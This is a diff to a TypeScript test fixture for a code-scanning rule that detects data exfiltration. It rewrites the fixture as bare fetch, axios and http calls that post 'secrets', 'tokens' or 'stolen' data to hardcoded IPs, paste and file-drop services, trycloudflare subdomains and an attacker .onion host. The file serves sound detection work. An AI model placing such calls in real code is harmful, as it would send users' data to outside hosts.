@@ -1,69 +1,47 @@
-// Fixture for rule 79353234aa907cd9 — API network calls to hardcoded IPs or
-// suspicious domains. Every call site below MUST fire the rule.
+// Fixture: the #1488 Rule A (ast-grep) MUST fire on every call below.
+// Each line is a canonical exfil-pattern call site. Matches PR1's bare-
+// call-site convention: no function wrappers, no unused vars.
+/* eslint-disable no-undef */
 
-// ─── Hardcoded IPv4 literals ────────────────────────
-export async function exfil_ipv4_fetch_single_arg() {
-  return fetch('http://185.220.101.5/exfil');
-}
+// @ts-nocheck — fixture file, not expected to type-check cleanly
 
-export async function exfil_ipv4_fetch_multi_arg() {
-  return fetch('https://45.33.32.156/drop', { method: 'POST' });
-}
+declare const fetch: (...a: unknown[]) => unknown;
+declare const axios: ((...a: unknown[]) => unknown) & {
+  get: (...a: unknown[]) => unknown;
+  post: (...a: unknown[]) => unknown;
+  put: (...a: unknown[]) => unknown;
+  delete: (...a: unknown[]) => unknown;
+  patch: (...a: unknown[]) => unknown;
+  head: (...a: unknown[]) => unknown;
+  request: (...a: unknown[]) => unknown;
+};
+declare const http: {
+  get: (...a: unknown[]) => unknown;
+  request: (...a: unknown[]) => unknown;
+};
+declare const https: {
+  get: (...a: unknown[]) => unknown;
+  request: (...a: unknown[]) => unknown;
+};
 
-export async function exfil_ipv4_axios() {
-  const axios: any = null as any;
-  await axios('http://185.220.101.5/steal');
-}
+// --- Hardcoded IPv4 literals ---
+fetch('http://185.220.101.5/exfil');
+fetch('https://45.33.32.156/drop', { method: 'POST' });
+axios('http://185.220.101.5/steal');
+axios.post('http://45.33.32.156:8080/tokens', { data: 'leak' });
+http.get('http://185.220.101.5/beacon');
+https.request('https://1.2.3.4/relay', () => {});
 
-export async function exfil_ipv4_axios_post() {
-  const axios: any = null as any;
-  await axios.post('http://45.33.32.156:8080/tokens', { data: 'leak' });
-}
+// --- Blocklisted exfil domains ---
+fetch('https://ngrok.io/abc', { method: 'POST' });
+fetch('https://pastebin.com/api/paste', { body: 'secrets' });
+axios.put('https://transfer.sh/leak.tar', 'payload');
+axios.post('https://gofile.io/upload', { data: 'stolen' });
+fetch('https://anonfiles.com/api/upload');
 
-export async function exfil_ipv4_http_get() {
-  const http: any = null as any;
-  http.get('http://185.220.101.5/beacon');
-}
+// --- Wildcard-domain subdomains (match on anchored `.trycloudflare.com`) ---
+fetch('https://attacker-proxy.trycloudflare.com/out');
+axios.post('https://foo.bar.trycloudflare.com/drop', { data: 'x' });
 
-export async function exfil_ipv4_https_request() {
-  const https: any = null as any;
-  https.request('https://1.2.3.4/relay', () => {});
-}
-
-// ─── Blocklisted exfil domains ──────────────────────
-export async function exfil_ngrok_fetch() {
-  return fetch('https://ngrok.io/abc', { method: 'POST' });
-}
-
-export async function exfil_pastebin_api_fetch() {
-  return fetch('https://pastebin.com/api/paste', { body: 'secrets' });
-}
-
-export async function exfil_transfer_sh_axios() {
-  const axios: any = null as any;
-  await axios.put('https://transfer.sh/leak.tar', 'payload');
-}
-
-export async function exfil_gofile_io_axios() {
-  const axios: any = null as any;
-  await axios.post('https://gofile.io/upload', { data: 'stolen' });
-}
-
-export async function exfil_anonfiles_fetch() {
-  return fetch('https://anonfiles.com/api/upload');
-}
-
-// ─── Wildcard-domain subdomains (match on anchored `.trycloudflare.com`) ─
-export async function exfil_trycloudflare_fetch() {
-  return fetch('https://attacker-proxy.trycloudflare.com/out');
-}
-
-export async function exfil_trycloudflare_axios() {
-  const axios: any = null as any;
-  await axios.post('https://foo.bar.trycloudflare.com/drop', { data: 'x' });
-}
-
-// ─── *.onion host match ─────────────────────────────
-export async function exfil_onion_fetch() {
-  return fetch('http://attacker3q7.onion/beacon');
-}
+// --- *.onion host match ---
+fetch('http://attacker3q7.onion/beacon');
